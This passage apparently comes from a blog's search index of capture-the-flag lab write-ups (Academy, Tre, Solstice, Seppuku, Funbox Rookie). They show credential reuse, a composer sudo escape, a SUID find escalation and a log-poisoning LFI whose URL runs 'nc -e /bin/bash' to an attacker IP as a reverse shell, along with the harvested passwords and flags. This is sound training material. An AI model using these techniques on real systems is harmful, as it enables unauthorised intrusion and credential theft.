.envAPP_NAME=LaravelAPP_ENV=localAPP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=APP_DEBUG=falseAPP_URL=http:/localhostLOG_CHANNEL=stackDB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=academyDB_USERNAME=devDB_PASSWORD=mySup3rP4s5w0rd!!BROADCAST_DRIVER=logCACHE_DRIVER=fileSESSION_DRIVER=fileSESSION_LIFETIME=120QUEUE_DRIVER=syncREDIS_HOST=127.0.0.1REDIS_PASSWORD=nullREDIS_PORT=6379MAIL_DRIVER=smtpMAIL_HOST=smtp.mailtrap.ioMAIL_PORT=2525MAIL_USERNAME=nullMAIL_PASSWORD=nullMAIL_ENCRYPTION=nullPUSHER_APP_ID=PUSHER_APP_KEY=PUSHER_APP_SECRET=PUSHER_APP_CLUSTER=mt1MIX_PUSHER_APP_KEY=\"${PUSHER_APP_KEY}\"MIX_PUSHER_APP_CLUSTER=\"${PUSHER_APP_CLUSTER}\"www-data@academy:/var/www/html/academy$```{: .nolineno}Letâ€™s use this password on user `cry0l1t3` â†’```bashpassword : mySup3rP4s5w0rd!!```{: .nolineno}```bashwww-data@academy:/home$ su cry0l1t3Password: $ whoamicry0l1t3$ /bin/bash -icry0l1t3@academy:/home$ whoamicry0l1t3cry0l1t3@academy:/home$ iduid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)cry0l1t3@academy:/home$```{: .nolineno}Lets see the `user.txt` file first â†’```bashcry0l1t3@academy:~$ ls -altotal 32drwxr-xr-x 4 cry0l1t3 cry0l1t3 4096 Aug 12 2020 .drwxr-xr-x 8 root root 4096 Aug 10 2020 ..lrwxrwxrwx 1 root root 9 Aug 10 2020 .bash_history -> /dev/null-rw-r--r-- 1 cry0l1t3 cry0l1t3 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 cry0l1t3 cry0l1t3 3771 Feb 25 2020 .bashrcdrwx------ 2 cry0l1t3 cry0l1t3 4096 Aug 12 2020 .cachedrwxrwxr-x 3 cry0l1t3 cry0l1t3 4096 Aug 12 2020 .local-rw-r--r-- 1 cry0l1t3 cry0l1t3 807 Feb 25 2020 .profile-r--r----- 1 cry0l1t3 cry0l1t3 33 Jul 21 04:15 user.txtcry0l1t3@academy:~$ cat user.txt6cfe1da1dbbcec654c05310b9e693f56cry0l1t3@academy:~$```{: .nolineno}Now I ran `linpeas.sh` file because I didnt find anything and I got something from it also â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%209.png)```bashmrb3n : mrb3n_Ac@d3my!```{: .nolineno}Now lets change the user to mrb3n â†’```bashcry0l1t3@academy:~$ su mrb3nPassword: $ /bin/bash -imrb3n@academy:/home/cry0l1t3$ cd ~mrb3n@academy:~$ whoamimrb3nmrb3n@academy:~$ iduid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)mrb3n@academy:~$ sudo -l[sudo] password for mrb3n: Matching Defaults entries for mrb3n on academy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser mrb3n may run the following commands on academy: (ALL) /usr/bin/composermrb3n@academy:~$```{: .nolineno}Now I used GIFObin for sudo commands â†’![Untitled](/Vulnhub-Files/img/Academy/Untitled%2010.png)```bashmrb3n@academy:~$ TF=$(mktemp -d)mrb3n@academy:~$ echo '{\"scripts\":{\"x\":\"/bin/sh -i 0&3 2>&3\"}}' >$TF/composer.jsonmrb3n@academy:~$ sudo composer --working-dir=$TF run-script xPHP Warning: PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0PHP Warning: PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0Do not run Composer as root/super user! See https:/getcomposer.org/root for details> /bin/sh -i 0&3 2>&3# /bin/bash -iroot@academy:/tmp/tmp.pQlh1O6ocq# cd ~root@academy:~# whoamirootroot@academy:~# iduid=0(root) gid=0(root) groups=0(root)root@academy:~# ls -altotal 68drwx------ 7 root root 4096 Feb 9 2021 .drwxr-xr-x 20 root root 4096 Feb 10 2021 ..-r--r----- 1 root root 1748 Nov 6 2020 academy.txtlrwxrwxrwx 1 root root 9 Aug 10 2020 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwx------ 2 root root 4096 Aug 8 2020 .cachedrwxr-xr-x 3 root root 4096 Aug 8 2020 .composerdrwxr-xr-x 3 root root 4096 Aug 7 2020 .local-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-r--r----- 1 root root 33 Jul 21 04:15 root.txt-rw-r--r-- 1 root root 66 Aug 12 2020 .selected_editordrwxr-xr-x 3 root root 4096 Aug 7 2020 snapdrwx------ 2 root root 4096 Aug 7 2020 .ssh-rw------- 1 root root 14087 Feb 9 2021 .viminfo-rw-r--r-- 1 root root 186 Sep 14 2020 .wget-hstsroot@academy:~# cat root.txta92f3b0883a39a3ee70f876391efb1c8root@academy:~# ```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Tre", "url": "/posts/Tre/", "categories": "Proving Grounds, Play", "tags": "PrivEsc, SUIDs, mysql", "date": "2023-07-16 00:00:00 +0530", "snippet": "### Lets see the IP address â†’```bashIP : 192.168.249.142```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/TRE]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.t...", "content": "### Lets see the IP address â†’```bashIP : 192.168.249.142```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/TRE]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.142Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-16 14:29 ISTNmap scan report for 192.168.249.142Host is up (0.00028s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 99:1a:ea:d7:d7:b3:48:80:9f:88:82:2a:14:eb:5f:0e (RSA)| 256 f4:f6:9c:db:cf:d4:df:6a:91:0a:81:05:de:fa:8d:f8 (ECDSA)|_ 256 ed:b9:a9:d7:2d:00:f8:1b:d3:99:d6:02:e5:ad:17:9f (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Tre8082/tcp open http nginx 1.14.2|_http-server-header: nginx/1.14.2|_http-title: TreMAC Address: 00:0C:29:7F:7E:7D (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}---## Web Enumeration âž¡ï¸Lets see the webpage â†’![Untitled](/Vulnhub-Files/img/Tre/Untitled.png)Now after directory or files bruteforcing I found different sites or directories running different services so lets see the config files first for credentials â†’![Untitled](/Vulnhub-Files/img/Tre/Untitled%201.png)![Untitled](/Vulnhub-Files/img/Tre/Untitled%202.png)```bash# --- Database Configuration ---$g_hostname = 'localhost';$g_db_username = 'mantissuser';$g_db_password = 'password@123AS';$g_database_name = 'mantis';$g_db_type = 'mysqli';```{: .nolineno}Lets use this credentials here `adminer.php` file â†’![Untitled](/Vulnhub-Files/img/Tre/Untitled%203.png)After entering that data I am in â†’![Untitled](/Vulnhub-Files/img/Tre/Untitled%204.png)Now I got the username and password credentials so lets alter that data and use it to login into the shell with our put data into it â†’![Untitled](/Vulnhub-Files/img/Tre/Untitled%205.png)Now lets modify it now â†’![Untitled](/Vulnhub-Files/img/Tre/Untitled%206.png)Now lets use this to replace our password hashes and save that â†’I tried to access the ssh login with hash password but no luck , then I tried its different looking realnames and tried it as a passwords and see I got in as tre user â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/TRE]â””â”€$ sudo ssh tre@192.168.249.142 tre@192.168.249.14 password: Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue May 12 23:56:00 2020 from 192.168.17.172tre@tre:~$ whoamitretre@tre:~$ iduid=1000(tre) gid=1000(tre) groups=1000(tre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)tre@tre:~$```{: .nolineno}Lets see `local.txt` file â†’```bashtre@tre:~$ ls -altotal 24drwxr-xr-x 2 tre tre 4096 Aug 23 2020 .drwxr-xr-x 3 root root 4096 May 11 2020 ..-rw-r--r-- 1 tre tre 220 May 11 2020 .bash_logout-rw-r--r-- 1 tre tre 3526 May 11 2020 .bashrc-rw-r--r-- 1 tre tre 33 Jul 16 06:52 local.txt-rw-r--r-- 1 tre tre 807 May 11 2020 .profiletre@tre:~$ cat local.txtec6b0276b5cbf898afe3bdb7c8da36b1tre@tre:~$```{: .nolineno}Now while cheching proccess running I got this â†’![Untitled](/Vulnhub-Files/img/Tre/Untitled%207.png)```bashtre@tre:/tmp$ ls -al /usr/bin/check-system-rw----rw- 1 root root 135 May 12 2020 /usr/bin/check-systemtre@tre:/tmp$ sudo -lMatching Defaults entries for tre on tre: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser tre may run the following commands on tre: (ALL) NOPASSWD: /sbin/shutdowntre@tre:/tmp$tre@tre:/tmp$ cat /usr/bin/check-systemDATE=`date '+%Y-%m-%d %H:%M:%S'`echo \"Service started at ${DATE}\" | systemd-cat -p infowhile :doecho \"Checking...\";sleep 1;donetre@tre:/tmp$```{: .nolineno}So after trying this `sudo shutdown` I got this â†’```bashtre@tre:/tmp$ sudo shutdownShutdown scheduled for Sun 2023-07-16 06:28:59 EDT, use 'shutdown -c' to cancel.tre@tre:/tmp$```{: .nolineno}means that I execute my command on writing into `/usr/bin/check-system` file and when I execute the `sudo shutdown` command it will also execute as root user so lets do it â€”>```bashtre@tre:~$ echo 'chmod u+s /usr/bin/find'> /usr/bin/check-systemtre@tre:~$ sudo /sbin/shutdown -r nowtre@tre:~$ Connection to 192.168.249.142 closed by remote host.Connection to 192.168.249.142 closed.```{: .nolineno}Now its time to restart the tre shell with ssh commands and lets check the `/usr/bin/find` command got SUIDs permissions or not â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/TRE]â””â”€$ sudo ssh tre@192.168.249.142 -p 22 tre@192.168.249.142s password: Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Jul 16 06:35:35 2023 from 192.168.249.128tre@tre:~$ ls -al /usr/bin/find-rwsr-xr-x 1 root root 315904 Feb 16 2019 /usr/bin/findtre@tre:~$ find . -exec /bin/bash -p \\; -quitbash-5.0# whoamirootbash-5.0# iduid=1000(tre) gid=1000(tre) euid=0(root) groups=1000(tre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)bash-5.0# cd /rootbash-5.0# ls -altotal 24drwx------ 2 root root 4096 Jul 16 06:52 .drwxr-xr-x 18 root root 4096 Jul 7 2020 ..-rw------- 1 root root 0 Sep 3 2020 .bash_history-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 33 Jul 16 06:52 proof.txt-rw-r--r-- 1 root root 32 Aug 23 2020 root.txtbash-5.0# cat proof.txt71a1ba68d15d0ebde47c8b8090b065cfbash-5.0# cat root.txtYour flag is in another file...bash-5.0#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Solstice", "url": "/posts/Solstice/", "categories": "Proving Grounds, Play", "tags": "LFI, PrivEsc", "date": "2023-07-16 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ Intermediate level machine{: .prompt-tip }### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Solstice/Untitled.png)```bashIP : 10.0.2.59```{: .nolineno}## ...", "content": "## **Description â¤µï¸**>ðŸ’¡ Intermediate level machine{: .prompt-tip }### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Solstice/Untitled.png)```bashIP : 10.0.2.59```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Solstice]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.59[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 09:32 ISTNmap scan report for 10.0.2.59Host is up (0.00097s latency).Not shown: 65525 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp pyftpdlib 1.5.6| ftp-syst: | STAT: | FTP server status:| Connected to: 10.0.2.59:21| Waiting for username.| TYPE: ASCII; STRUcture: File; MODE: Stream| Data connection closed.|_End of status.22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 5b:a7:37:fd:55:6c:f8:ea:03:f5:10:bc:94:32:07:18 (RSA)| 256 ab:da:6a:6f:97:3f:b2:70:3e:6c:2b:4b:0c:b7:f6:4c (ECDSA)|_ 256 ae:29:d4:e3:46:a1:b1:52:27:83:8f:8f:b0:c4:36:d1 (ED25519)25/tcp open smtp Exim smtpd 4.92| smtp-commands: solstice Hello nmap.scanme.org [10.0.2.27], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Site doesnt have a title (text/html).139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)2121/tcp open ftp pyftpdlib 1.5.6| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drws------ 2 www-data www-data 4096 Jun 18 2020 pub| ftp-syst: | STAT: | FTP server status:| Connected to: 10.0.2.59:2121| Waiting for username.| TYPE: ASCII; STRUcture: File; MODE: Stream| Data connection closed.|_End of status.3128/tcp open http-proxy Squid http proxy 4.6|_http-server-header: squid/4.6|_http-title: ERROR: The requested URL could not be retrieved8593/tcp open http PHP cli server 5.5 or later (PHP 7.3.14-1)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-title: Site doesnt have a title (text/html; charset=UTF-8).54787/tcp open http PHP cli server 5.5 or later (PHP 7.3.14-1)|_http-title: Site doesnt have a title (text/html; charset=UTF-8).MAC Address: 08:00:27:A8:97:64 (Oracle VirtualBox virtual NIC)Service Info: Host: solstice: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required|_nbstat: NetBIOS name: SOLSTICE, NetBIOS user: , NetBIOS MAC: (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.9.5-Debian)| Computer name: \\x00| NetBIOS computer name: SOLSTICE\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2023-07-10T00:03:15-04:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time: | date: 2023-07-10T04:03:14|_ start_date: N/A|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s```{: .nolineno}---## FTP Enumeration â¤µï¸On port 2121 I tried anonymous login and I got in and I found this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Solstice]â””â”€$ ftp 10.0.2.59 2121Connected to 10.0.2.59.220 pyftpdlib 1.5.6 ready.Name (10.0.2.59:kali): anonymous331 Username ok, send password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering extended passive mode (|||40425|).125 Data connection already open. Transfer starting.drws------ 2 www-data www-data 4096 Jun 18 2020 pub226 Transfer complete.ftp> get publocal: pub remote: pub229 Entering extended passive mode (|||60487|).550 Is a directory.ftp>```{: .nolineno}But I canâ€™t get anything so lets leave it for now and lets enumerate further more .## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Solstice/Untitled%201.png)Now lets look at port 8593 â†’![Untitled](/Vulnhub-Files/img/Solstice/Untitled%202.png)letâ€™s try LFI(Local File Inclusion) here â†’![Untitled](/Vulnhub-Files/img/Solstice/Untitled%203.png)Now when I loaded the access.log file server was not able to proccess it so I reloaded the machine and tried it by first including the User-Agent with curl tool â†’```bash â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Solstice]â””â”€$ curl 192.168.231.72 -A \"\" Currently configuring the database, try later. Proudly powered by phpIPAM 1.4```{: .nolineno}Now lets load this reverse shell URL â†’```bashhttp://192.168.231.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20-e%20/bin/bash%20192.168.45.164%204444```{: .nolineno}In response to that I got this â†’---## SHELL â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Solstice]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.45.164] from (UNKNOWN) [192.168.231.72] 54424python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@solstice:/var/tmp/webserver$ whoamiwhoamiwww-datawww-data@solstice:/var/tmp/webserver$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@solstice:/var/tmp/webserver$```{: .nolineno}Found local.txt file â†’```bashwww-data@solstice:~$ cat local.txtcat local.txt46dccaf36ae8422c374c3f9292c9f6c8www-data@solstice:~$```{: .nolineno}Now while reconnaissance ******I found this file â†’```bashwww-data@solstice:/var/tmp/sv$ ls -altotal 12drwsrwxrwx 2 root root 4096 Jul 10 04:07 .drwxrwxrwt 9 root root 4096 Jul 10 04:09 ..-rwxrwxrwx 1 root root 3463 Jul 10 04:07 index.php```{: .nolineno}Now I can modify this file with my `php-reverse-shell` file â†’Now it time to run this file but I was confussed with the port number in which it is running on So I checked the network configuration with ports and got this â†’```bashwww-data@solstice:/var/tmp$ ss -tunlp | grep 127.0.0.1tcp LISTEN 0 5 127.0.0.1:631 0.0.0.0:* tcp LISTEN 0 128 127.0.0.1:57 0.0.0.0:* tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* www-data@solstice:/var/tmp$```{: .nolineno}Now I have a port number of 57 on which this index.php could be running so when I did the curl â†’```bashwww-data@solstice:/var/tmp$ curl localhost:57```{: .nolineno}And I recived a reverse shell on port 4444 on Attackers machine as root â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Solstice]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [192.168.45.164] from (UNKNOWN) [192.168.231.72] 54478Linux solstice 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux 04:26:49 up 59 min, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=0(root) gid=0(root) groups=0(root)/bin/sh: 0: cant access tty; job control turned off# /bin/bash -ibash: cannot set terminal process group (17962): Inappropriate ioctl for devicebash: no job control in this shellroot@solstice:/# whoamiwhoamirootroot@solstice:/# ididuid=0(root) gid=0(root) groups=0(root)root@solstice:/# cd /rootcd /rootroot@solstice:~# ls -alls -altotal 56drwx------ 9 root root 4096 Jul 10 03:30 .drwxr-xr-x 18 root root 4096 Jun 29 2020 ..lrwxrwxrwx 1 root root 9 Jun 26 2020 .bash_history -> /dev/null-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwx------ 3 root root 4096 Jun 17 2020 .cachedrwxr-xr-x 3 root root 4096 Jun 13 2020 .configdrwxr-xr-x 2 root root 4096 Jun 19 2020 ftpdrwx------ 3 root root 4096 Jun 18 2020 .gnupgdrwxr-xr-x 3 root root 4096 Jun 13 2020 .local-rw------- 1 root root 0 Aug 7 2020 .mysql_history-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 33 Jul 10 03:30 proof.txt-rw-r--r-- 1 root root 32 Aug 13 2020 root.txt-rw-r--r-- 1 root root 66 Jun 13 2020 .selected_editordrwx------ 2 root root 4096 Jun 19 2020 .ssh-rw-r--r-- 1 root root 0 Aug 13 2020 .wget-hstsdrwxr-xr-x 4 root root 4096 Jun 18 2020 .wineroot@solstice:~# cat root.txtcat root.txtYour flag is in another file...root@solstice:~# cat proof.txtcat proof.txtd7acbf3dd425d114f36d106ffa12a6c7root@solstice:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Seppuku", "url": "/posts/Seppuku/", "categories": "Proving Grounds, Play", "tags": "FTP, Lateral Movement, PrivEsc", "date": "2023-07-16 00:00:00 +0530", "snippet": "### Now lets check the IP of Victim Machine â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled.png)```bashIP : 192.168.249.132```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Sep...", "content": "### Now lets check the IP of Victim Machine â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled.png)```bashIP : 192.168.249.132```{: .nolineno}## Port Scan Results âž¡ï¸![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%201.png)![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%202.png)**Open Ports are â†’**```textHTTP >\t80\t\t\tnginx 1.14.2\t7080\t\tLiteSpeed httpd\t7601\t\tApache httpd 2.4.38 ((Debian))\t8088\t\tLiteSpeed httpdFTP >\t21\t\t\tvsftpd 3.0.3SMB >\t139\t445SSH >\t22```{: .nolineno}## Web Enumeration âž¡ï¸lets see the directory or files bruteforcing files â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%203.png)Now lets look into /secret Folder â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%204.png)Now on port 8080 I got a webshell with login interface â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%205.png)On port 7601 I found private key of a user â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%206.png)lets take user as in `seppuku` and lets brute-force the password for ssh login â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%207.png)```bashseppuku : eeyoree```{: .nolineno}---## SHELL âž¡ï¸![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%208.png)I found a password file â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%209.png)```bashpassword â†’ 12345685213456!@!@A```{: .nolineno}Now using this password I switched the user as `samurai` â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%2010.png)Now lets see the `sudo -l` that command can lead me to root â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%2011.png)Now I donâ€™t have permmision to create a folder or file into user `tanto` , so after chech cheching the id I can say I can perform `Lateral Movement` into tanto user so lets perform that â†’Now lets access that private key here on samurai directory â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%2012.png)Now lets perform Lateral Movement into tanto user â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%2013.png)Now lets do what needs to be done to access root user from samurai user â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%2014.png)Now coming back to samurai and executing it â†’![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%2015.png)Now I am root !!![Untitled](/Vulnhub-Files/img/Seppuku/Untitled%2016.png)```bashroot.txt â†’ {SunCSR_Seppuku_2020_X}```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Funbox : Rookie", "url": "/posts/Funbox-Rookie/", "categories": "Proving Grounds, Play, Funbox", "tags": "FTP, Public Exploit, Unzip, PrivEsc", "date": "2023-07-16 00:00:00 +0530", "snippet": "## **Description â¤µï¸**>ðŸ’¡ [Funbox : Rookie](https://www.vulnhub.com/entry/funbox-rookie,520/)Boot2Root ! This can be a real life scenario if rockies becomes admins. Easy going in round about 15 mins....", "content": "## **Description â¤µï¸**>ðŸ’¡ [Funbox : Rookie](https://www.vulnhub.com/entry/funbox-rookie,520/)Boot2Root ! This can be a real life scenario if rockies becomes admins. Easy going in round about 15 mins. Bit more, if you are find and stuck in the rabbit-hole first.This VM is created/tested with Virtualbox. Maybe it works with vmware.If you need hints, call me on twitter: @0815R2d2Have fun...This works better with VirtualBox rather than VMware.{: .prompt-info }### Letâ€™s find the IP Address first >>```bashIP : 192.168.225.107```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Funbox-Rookie]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_results.txt 192.168.225.107Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-08 15:37 ISTNmap scan report for 192.168.225.107Host is up (0.17s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.5e| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 anna.zip| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 ariel.zip| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 bud.zip| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 cathrine.zip| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 homer.zip| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 jessica.zip| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 john.zip| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 marge.zip| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 miriam.zip| -r--r--r-- 1 ftp ftp 1477 Jul 25 2020 tom.zip| -rw-r--r-- 1 ftp ftp 170 Jan 10 2018 welcome.msg| -rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 zlatan.zip22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)| 256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)|_ 256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.29 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/logs/Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}---## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Funbox-Rookie/Untitled.png)Lets check `robots.txt` file â†’![Untitled](/Vulnhub-Files/img/Funbox-Rookie/Untitled%201.png)## FTP Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Funbox-Rookie]â””â”€$ ftp 192.168.225.107 21Connected to 192.168.225.107.220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.225.107]Name (192.168.225.107:kali): anonymous331 Anonymous login ok, send your complete email address as your passwordPassword: 230-Welcome, archive user anonymous@192.168.45.178 !230-230-The local time is: Sat Jul 08 10:10:10 2023230-230-This is an experimental FTP server. If you have any unusual problems,230-please report them via e-mail to .230-230 Anonymous access granted, restrictions applyRemote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering Extended Passive Mode (|||7526|)150 Opening ASCII mode data connection for file listdrwxr-xr-x 2 ftp ftp 4096 Jul 25 2020 .drwxr-xr-x 2 ftp ftp 4096 Jul 25 2020 ..-rw-r--r-- 1 ftp ftp 153 Jul 25 2020 .@admins-rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 anna.zip-rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 ariel.zip-rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 bud.zip-rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 cathrine.zip-rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 homer.zip-rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 jessica.zip-rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 john.zip-rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 marge.zip-rw-rw-r-- 1 ftp ftp 1477 Jul 25 2020 miriam.zip-r--r--r-- 1 ftp ftp 1477 Jul 25 2020 tom.zip-rw-r--r-- 1 ftp ftp 114 Jul 25 2020 .@users-rw-r--r-- 1 ftp ftp 170 Jan 10 2018 welcome.msg-rw-rw-r-- 1 